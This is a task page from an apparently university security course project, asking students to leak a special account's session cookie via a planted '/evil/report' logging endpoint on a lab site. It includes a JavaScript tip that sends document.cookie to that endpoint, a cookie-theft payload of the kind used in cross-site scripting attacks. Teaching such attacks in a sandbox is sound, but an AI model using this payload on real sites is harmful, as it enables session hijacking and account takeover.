---
title: 'Flag 5: cs161'
nav_order: 50
---

# Leak `cs161`'s session cookie

_Difficulty:_ Medium

Because it is a special-purpose account, you won't find `cs161`'s session token
in the database. However, `cs161` still sends a `session_token` cookie to the
server with every request, so you might be able to leak `cs161`'s token using a
different attack.

Your CS161 alumni ally has inserted some evil malware that lets you log
arbitrary values to an internal dashboard. When you send a HTTP GET Request to
the `/evil/report` endpoint and include a `message` parameter, the `message` is
posted to the `/evil/logs` page. Try it by visiting the following URL in your
browser!

```
https://proj3.cs161.org/evil/report?message=hello1234
```

**Your task:** Leak `cs161`'s session cookie by pushing it onto the `/evil/logs`
page.

_Tip:_ You may want to try this attack on yourself before executing it on
another user.

_Tip:_ You may find this block of JavaScript code useful:

```
fetch('/evil/report?message='+document.cookie)
```

_Tip:_ You may assume the cs161 user will be browsing the main pages of the
site in the background (e.g. home, list, upload, etc.).
